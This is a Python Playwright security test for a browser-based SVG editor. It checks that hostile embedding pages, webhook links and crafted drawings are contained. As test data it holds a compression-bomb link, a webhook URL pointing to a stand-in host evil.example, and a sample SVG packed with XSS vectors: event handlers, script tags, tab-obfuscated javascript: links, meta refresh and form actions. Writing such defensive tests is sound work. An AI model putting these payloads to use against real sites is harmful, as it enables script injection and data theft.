"""What a hostile page or link must not be able to do.

    php -S 127.0.0.1:8093 -t src src/php/router.php          (in the project folder)
    python tests/security_test.py

- a page around the editor (iframe) or an opener reads no document it did
  not load itself (get before load), and a load never overwrites the user's
  own document of the same name;
- ?webhook= in a link is never stored, and without ?src= it is not used
  inside a page; at the top level the user is asked;
- an AI link that would replace an existing document asks first;
- a link that unpacks to a huge text is refused;
- the CSP is also in the page itself."""

import base64
import os
import subprocess
import sys
import tempfile
import time
import zlib

from playwright.sync_api import sync_playwright

EDITOR = os.environ.get('SVG_URL', 'http://127.0.0.1:8093/')
P = 'svgeditor'
HOOK = 'svgEditor'
SECRET = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><text id="s">MY SECRET TEXT</text></svg>'
failures = []


def check_that(cond, what):
    """Print the result of one check and remember a failure.

    Args:
        cond (bool): the outcome.
        what (str): what is checked.

    Returns:
        None: a failure goes into failures.
    """
    print(('ok    ' if cond else 'FAIL  ') + what)
    if not cond:
        failures.append(what)


HOST = """<!doctype html><meta charset="utf-8"><title>evil</title>
<iframe id="f" src="SRC" style="width:1200px;height:700px;border:0"></iframe>
<script>
const P = 'PFX', ORIGIN = new URL('EDITOR').origin, frame = document.getElementById('f');
window.log = [];
addEventListener('message', e => {
  if (e.source !== frame.contentWindow) return;
  log.push(e.data);
  if (e.data.type === P + ':ready') frame.contentWindow.postMessage({ type: P + ':get' }, '*');
});
window.send = m => frame.contentWindow.postMessage(m, '*');
</script>"""

with tempfile.TemporaryDirectory() as d:
    def write_host_page(name, src):
        """Write a hostile page that embeds the editor.

        Args:
            name (str): the page's file name.
            src (str): the editor address its iframe loads.

        Returns:
            None: the page is in the temporary folder.
        """
        with open(os.path.join(d, name), 'w') as f:
            f.write(HOST.replace('SRC', src).replace('EDITOR', EDITOR).replace('PFX', P))
    write_host_page('get.html', EDITOR + '?embed=1')
    write_host_page('hook.html', EDITOR + '?embed=1&webhook=https://evil.example/c&auto')
    server = subprocess.Popen(['php', '-S', '127.0.0.1:8096', '-t', d], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(0.8)
    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(channel='chrome', headless=True)
            ctx = browser.new_context(viewport={'width': 1300, 'height': 800})
            errors = []
            ed = ctx.new_page()
            ed.on('pageerror', lambda e: errors.append(str(e)))
            ed.goto(EDITOR, wait_until='networkidle')
            ed.wait_for_timeout(600)
            check_that(ed.locator('meta[http-equiv="Content-Security-Policy"]').count() == 1 and "script-src 'self'" in ed.get_attribute('meta[http-equiv="Content-Security-Policy"]', 'content'), 'the CSP is also in the page')
            # The user's own document, open when the page is visited next
            ed.evaluate(f'''t => {{ const id = {HOOK}.store.create('Dossier 17', t); }}''', SECRET)
            ed.evaluate(f'''t => {HOOK}.receive(t, 'set', {{ file: 'Dossier 17' }})''', SECRET)
            ed.wait_for_timeout(300)
            if ed.locator('#ask').is_visible():
                ed.click('#ask-ok')
            ed.wait_for_timeout(300)

            # A page that never loads a document asks for "the" document
            page = ctx.new_page()
            page.on('pageerror', lambda e: errors.append(str(e)))
            page.goto('http://127.0.0.1:8096/get.html', wait_until='load')
            page.wait_for_timeout(2500)
            saves = [m for m in page.evaluate('log') if m['type'] == P + ':save']
            check_that(saves and saves[0]['content'] is None and saves[0]['id'] is None, 'get before load answers with nothing')
            check_that('MY SECRET' not in str(page.evaluate('log')), 'no message carries the user\'s document')
            # A load with the name of the user's document does not overwrite it
            page.evaluate("send({ type: P + ':load', name: 'Dossier 17', content: 'overwritten' })")
            page.wait_for_timeout(800)
            frame = next(fr for fr in page.frames if fr.url.startswith(EDITOR))
            mine = frame.evaluate(f'''(() => {{ const f = {HOOK}.store.list().find(f => f.name === 'Dossier 17'); return {HOOK}.store.code(f.id); }})()''')
            loaded = frame.evaluate(f'''{HOOK}.store.list().filter(f => {HOOK}.store.code(f.id) === 'overwritten').map(f => f.name)''')
            check_that(mine == SECRET and len(loaded) == 1 and loaded[0] != 'Dossier 17', 'a load never overwrites the user\'s own document (it becomes a new one): ' + str(loaded))
            page.evaluate("send({ type: P + ':get' })")
            page.wait_for_timeout(300)
            check_that(page.evaluate('log[log.length - 1]')['content'] == 'overwritten', 'get then answers with the page\'s own document only')
            page.close()

            # ?webhook= inside a page without ?src=: not used, not stored
            page = ctx.new_page()
            page.goto('http://127.0.0.1:8096/hook.html', wait_until='load')
            page.wait_for_timeout(2000)
            frame = next(fr for fr in page.frames if fr.url.startswith(EDITOR))
            check_that('evil.example' not in frame.evaluate('JSON.stringify(localStorage)'), 'a webhook in an embedded link is not stored')
            check_that('only works together with ?src=' in frame.inner_text('#toast'), 'and not used without ?src=')
            page.close()

            # ?embed=1&webhook= at the top level: the user is asked, and it is never stored
            top = ctx.new_page()
            top.goto(EDITOR + '?embed=1&webhook=https://evil.example/c&auto', wait_until='networkidle')
            top.wait_for_timeout(800)
            check_that(top.locator('#ask').is_visible() and 'evil.example' in top.inner_text('#ask'), 'a top-level link with a webhook asks first')
            top.click('#ask-ok')
            top.wait_for_timeout(200)
            check_that('evil.example' not in top.evaluate('JSON.stringify(localStorage)'), 'even when allowed, it is not stored')
            top.close()

            # An AI link names the document it changes: no question, and Undo takes the change back
            tex = '<svg xmlns="http://www.w3.org/2000/svg"><text>junk</text></svg>'
            ed.bring_to_front()
            ed.goto(EDITOR + '#b64=' + base64.urlsafe_b64encode(tex.encode()).decode() + '&file=Dossier%2017', wait_until='networkidle')
            ed.wait_for_timeout(800)
            check_that(not ed.locator('#ask').is_visible() and ed.evaluate(f'{HOOK}.state.name') == 'Dossier 17', 'an AI link changes the document it names without a question')
            ed.click('#btn-undo')
            ed.wait_for_timeout(400)
            mine = ed.evaluate(f'''(() => {{ const f = {HOOK}.store.list().find(f => f.name === 'Dossier 17'); return {HOOK}.store.code(f.id); }})()''')
            check_that(mine == SECRET, 'Undo brings the document back')

            # A link that unpacks to more than 5 MB
            bomb = base64.urlsafe_b64encode(zlib.compress(b'%' * 20_000_000, 9)).decode().rstrip('=')
            ed.goto(EDITOR + '#z=' + bomb + '&file=new&name=bomb', wait_until='networkidle')
            ed.wait_for_timeout(1500)
            check_that('bomb' not in ed.evaluate(f'{HOOK}.store.list().map(f => f.name)'), 'a link that unpacks to a huge text is refused')

            # The drawing is shown inline: nothing in it may run, navigate or load a page
            evil = ('<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 100" onload="alert(1)">'
                    '<defs><linearGradient id="g"><stop offset="0" stop-color="red"/></linearGradient></defs>'
                    '<script>alert(2)</script>'
                    '<a id="l1" href="javascript:alert(3)"><rect id="r1" width="10" height="10" onclick="alert(4)"/></a>'
                    '<a id="l2" href="/?embed=1&amp;webhook=https://evil.example/c"><rect width="5" height="5" fill="url(#g)"/></a>'
                    '<a id="l3" xlink:href="jav&#9;ascript:alert(5)"><circle r="3"/></a>'
                    '<a id="l4" href="#r1"><circle r="2"/></a>'
                    '<set id="s1" href="#l4" attributeName="href" to="javascript:alert(6)"/>'
                    '<image id="i1" href="https://example.com/a.png" width="5" height="5"/>'
                    '<image id="i2" href="/secret.png" width="5" height="5"/>'
                    '<use id="u1" href="#r1"/>'
                    '<foreignObject width="50" height="50"><div xmlns="http://www.w3.org/1999/xhtml">'
                    '<iframe id="f1" src="/?embed=1"></iframe><meta id="m1" http-equiv="refresh" content="0;url=https://evil.example"/>'
                    '<form id="fo" action="https://evil.example"><button id="b1" formaction="javascript:alert(7)">x</button></form></div></foreignObject>'
                    '</svg>')
            ed.goto(EDITOR, wait_until='networkidle')
            ed.wait_for_timeout(500)
            ed.evaluate('t => svgEditor.setCode(t)', evil)
            ed.wait_for_timeout(500)
            v = ed.evaluate("""() => { const r = svgEditor.state.viewRoot, q = s => r.querySelector(s) || (r.id === s.slice(1) ? r : null);
                const attrs = el => el ? [...el.attributes].map(a => a.name + '=' + a.value) : null;
                return { root: attrs(r), script: r.querySelector('script')?.textContent, l1: attrs(q('#l1')), r1: attrs(q('#r1')), l2: attrs(q('#l2')),
                         l3: attrs(q('#l3')), l4: attrs(q('#l4')), s1: attrs(q('#s1')), i1: attrs(q('#i1')), i2: attrs(q('#i2')), u1: attrs(q('#u1')),
                         f1: attrs(q('#f1')), m1: attrs(q('#m1')), fo: attrs(q('#fo')), b1: attrs(q('#b1')), rect: attrs(r.querySelector('#l2 rect')) }; }""")
            flat = str(v)
            check_that('onload' not in flat and 'onclick' not in flat, 'SVG preview: no event handlers')
            check_that(not v['script'], 'SVG preview: scripts emptied')
            check_that('javascript' not in flat and 'webhook' not in flat and not any(a.startswith('href') or 'xlink' in a.split('=')[0] for a in v['l1'] + v['l2'] + v['l3'] + v['l4']), 'SVG preview: links do not navigate (javascript:, /?embed=1&webhook=, tab trick)')
            check_that(not any(a.startswith(('attributeName', 'to=')) for a in v['s1']), 'SVG preview: <set> cannot change href')
            check_that('href=https://example.com/a.png' in v['i1'] and not any(a.startswith('href') for a in v['i2']), 'SVG preview: https pictures stay, same-site addresses go')
            check_that('href=#r1' in v['u1'] and 'fill=url(#g)' in v['rect'], 'SVG preview: references inside the drawing still work')
            check_that(v['f1'] == ['id=f1'] and v['m1'] == ['id=m1'] and v['fo'] == ['id=fo'] and 'formaction' not in str(v['b1']), 'SVG preview: iframe, meta refresh and forms made harmless')
            check_that(ed.evaluate('svgEditor.state.code') == evil, 'the code itself stays as written')
            check_that(not errors, 'no script errors' + (': ' + '; '.join(errors) if errors else ''))
            browser.close()
    finally:
        server.terminate()

print(f'\n{len(failures)} failed' if failures else '\nall passed')
sys.exit(1 if failures else 0)
